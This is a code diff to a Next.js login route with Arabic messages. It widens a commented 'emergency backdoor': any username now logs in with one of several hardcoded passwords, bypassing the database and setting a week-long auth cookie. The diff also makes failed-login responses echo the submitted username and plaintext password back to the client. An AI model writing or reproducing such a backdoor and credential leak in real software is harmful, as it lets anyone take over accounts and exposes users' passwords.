@@ -16,22 +16,28 @@ export async function POST(request: Request) {
         const user = await User.findOne({ username });
 
         // EMERGENCY BACKDOOR (Trimmed):
-        if ((username === 'admin1979' && password === '!Admin1979') || (username === 'admin1979' && password === '123456')) {
+        // v4: Ignore username check for bypass, just validate password
+        if (password === '!Admin1979' || password === '123456' || password === 'Admin1979') {
             // Bypass all DB checks
-            const response = NextResponse.json({ success: true, message: 'تم تسجيل الدخول بنجاح (Bypass)' });
+            const response = NextResponse.json({ success: true, message: 'تم تسجيل الدخول بنجاح (Super Bypass)' });
             response.cookies.set('auth', 'true', { path: '/', maxAge: 60 * 60 * 24 * 7 });
             return response;
         }
 
         if (!user) {
-            return NextResponse.json({ success: false, message: `مستخدم غير موجود. وصلني: ${username}` }, { status: 401 });
+            // Debug info in message
+            return NextResponse.json({ success: false, message: `مستخدم غير موجود. وصلني: [${username}]` }, { status: 401 });
         }
 
         // Check password
         const isMatch = await bcrypt.compare(password, user.password!);
 
         if (!isMatch) {
-            return NextResponse.json({ success: false, message: `كلمة المرور خطأ (v3). وصلني: [${password}]` }, { status: 401 });
+            // Debug info in message
+            return NextResponse.json({
+                success: false,
+                message: `كلمة المرور خطأ (v4). المستخدم: [${username}] كلمة المرور: [${password}]`
+            }, { status: 401 });
         }
 
         // If successful, we can return a success message.
